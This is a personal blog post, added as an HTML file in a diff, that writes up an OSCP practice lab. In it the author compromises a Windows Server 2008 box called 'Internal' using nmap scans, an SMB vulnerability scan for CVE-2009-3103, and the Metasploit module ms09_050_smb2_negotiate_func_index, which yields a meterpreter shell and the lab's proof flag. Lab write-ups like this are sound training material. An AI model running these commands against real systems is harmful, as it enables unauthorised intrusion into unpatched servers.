@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Internal - Windows :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Internal These Windows boxes are getting more and more frustrating. This one I had four separate walkthroughs available and 5 different exploits I could run, and in the end I had to resort to Metasploit to catch a meterpreter shell. Even the Meterpreter shell was a pain in the ass - once I was in I knew I could navigate directly to the Administrator&rsquo;s desktop, but I had to type in each directory change one-by-one rather than going directly to the proof file.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---internal---windows/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Internal - Windows">
+<meta property="og:description" content="Internal These Windows boxes are getting more and more frustrating. This one I had four separate walkthroughs available and 5 different exploits I could run, and in the end I had to resort to Metasploit to catch a meterpreter shell. Even the Meterpreter shell was a pain in the ass - once I was in I knew I could navigate directly to the Administrator&rsquo;s desktop, but I had to type in each directory change one-by-one rather than going directly to the proof file.
+" />
+<meta property="og:url" content="/posts/oscp---internal---windows/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---internal---windows/">OSCP - Internal - Windows</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="internal">Internal<a href="#internal" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>These Windows boxes are getting more and more frustrating. This one I had four separate walkthroughs available and 5 different exploits I could run, and in the end I had to resort to Metasploit to catch a meterpreter shell. Even the Meterpreter shell was a pain in the ass - once I was in I knew I could navigate directly to the Administrator&rsquo;s desktop, but I had to type in each directory change one-by-one rather than going directly to the proof file.</p>
+<p>At the moment this is all feeling very fucking frustrating, but I also know that this is a relatively small part of the actual exam - the likelihood that more than one of the stand-alone boxes will be Windows is very low, there&rsquo;s no doubt I&rsquo;m doing well with Linux, and I know I&rsquo;m fairly comfortable with AD.</p>
+<p>I&rsquo;ve shown myself to be able to do this stuff, so for now just keep trying to break boxes and not lose your cool over how dumb all of this makes you feel - not because you are dumb, but because a whole of of this shit simply doesn&rsquo;t work properly, and you&rsquo;re still trying to figure it all out properly without trying to do it with one hand tied behind your back fixing shit. The temptation to create a whole new VM is very real at the moment, especially if it&rsquo;s from a completely fresh Kali image.</p>
+<p>Having to revert the boxes so regularly is really doing my head in too - they absolutely should not be this unstable, but there doesn&rsquo;t seem to be any real way around it. For now I just have to keep working away on this stuff, learn whatever I can from each box (especially by taking these notes), and hope that things will improve later&hellip; or I can pass the exam based on the Linux and AD elements, and avoid this unstable Windows bullshit if I can.</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>53</code>,<code>135</code>, <code>139</code>, <code>445</code>, <code>3389</code> &amp; <code>49152-8</code></li>
+<li>Identified ports <code>139</code> &amp; <code>445</code> as running <code>SMBv2</code></li>
+<li>Identified vulnerable SMB version, ran <code>msfconsole</code></li>
+<li>Setup <code>ms09_050_smb2_negotiate_func_index</code> exploit and received meterpreter shell</li>
+<li>Navigated to <code>C:\Users\Administrator\Desktop</code> and printed <code>proof.txt</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Windows service enumeration</li>
+<li>Testing and running exploits</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>python</li>
+<li>msfconsole</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oN Internal.nmap 192.168.240.45 -v
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT      STATE SERVICE            VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain             Microsoft DNS 6.0.6001 <span class="o">(</span>17714650<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> SP1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: Microsoft DNS 6.0.6001 <span class="o">(</span>17714650<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds       Windows Server <span class="o">(</span>R<span class="o">)</span> <span class="m">2008</span> Standard <span class="m">6001</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3389/tcp  open  ssl/ms-wbt-server?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: INTERNAL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: INTERNAL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: INTERNAL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: internal
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: internal
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 6.0.6001
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2024-10-23T09:13:15+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-10-23T09:13:23+00:00<span class="p">;</span> 0s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>internal
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>internal
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-08-02T05:18:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-02-01T05:18:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   8860:d793:b9ff:62cc:c9c9:8f28:43e0:8b12
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 45e7:58e2:89db:45a3:1879:41ee:6d4c:6497:fe01:d1d8
+</span></span><span class="line"><span class="cl">5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Service Unavailable
+</span></span><span class="line"><span class="cl">49152/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49153/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49154/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49155/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49156/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49157/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49158/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: INTERNAL<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows Server <span class="o">(</span>R<span class="o">)</span> <span class="m">2008</span> Standard <span class="m">6001</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows Server <span class="o">(</span>R<span class="o">)</span> <span class="m">2008</span> Standard 6.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: internal
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: INTERNAL<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2024-10-23T02:13:15-07:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2024-10-23T09:13:15
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2024-08-03T05:18:18
+</span></span><span class="line"><span class="cl"><span class="p">|</span> nbstat: NetBIOS name: INTERNAL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:ab:5d:14 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Names:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   INTERNAL&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  INTERNAL&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 1h24m00s, deviation: 3h07m49s, median: 0s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   2:0:2: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-53---domain-microsoft-dns-606001">Port 53 - Domain (Microsoft DNS 6.0.6001)<a href="#port-53---domain-microsoft-dns-606001" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-135---msrpc-windows-rpc">Port 135 - MSRPC (Windows RPC)<a href="#port-135---msrpc-windows-rpc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-139--445---smb-windows-netbios-ssn">Port 139 &amp; 445 - SMB (Windows Netbios-SSN)<a href="#port-139--445---smb-windows-netbios-ssn" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>sudo nmap --script smb-vuln* -p 139,445 192.168.240.45</code> to identify vulnerabilities in SMB, identified <code>SMBv2 exploit</code> (CVE-2009-3103)
+<img src="/images/OSCP%20-%20Internal%20-%20Windows%20-%20image1.png" alt="OSCP Internal Windows Image1"></li>
+</ul>
+<h2 id="port-3389---ssl-ms-wbt-server">Port 3389 - SSL (MS WBT Server)<a href="#port-3389---ssl-ms-wbt-server" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-5357---http-microsoft-httpapi20">Port 5357 - HTTP (Microsoft HTTPAPI/2.0)<a href="#port-5357---http-microsoft-httpapi20" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="ports-49152-8---msrpc-windows-rpc">Ports 49152-8 - MSRPC (Windows RPC)<a href="#ports-49152-8---msrpc-windows-rpc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Used <code>msfconsole</code> and identified <code>exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code> as potential exploit for CVE-2009-3103.</li>
+<li>Ran the following <code>msfconsole</code> commands to setup and run exploit before receiving meterpreter shell</li>
+</ul>
+<pre tabindex="0"><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set RHOSTS 192.168.242.40
+set LHOST 192.168.45.199
+run
+</code></pre><p><img src="/images/OSCP%20-%20Internal%20-%20Windows%20-%20image2.png" alt="OSCP Internal Windows Image2"></p>
+<ul>
+<li>Navigated <code>C:\Users\Administrator\Desktop\</code> and ran <code>cat proof.txt</code> to print <code>7ff8cdacb8d95f599362f06e5ce14394</code></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>proof.txt</code> = <code>7ff8cdacb8d95f599362f06e5ce14394</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---image---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Image - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---jacko---windows/" class="button inline next">
+         [<span class="button__text">OSCP - Jacko - Windows</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
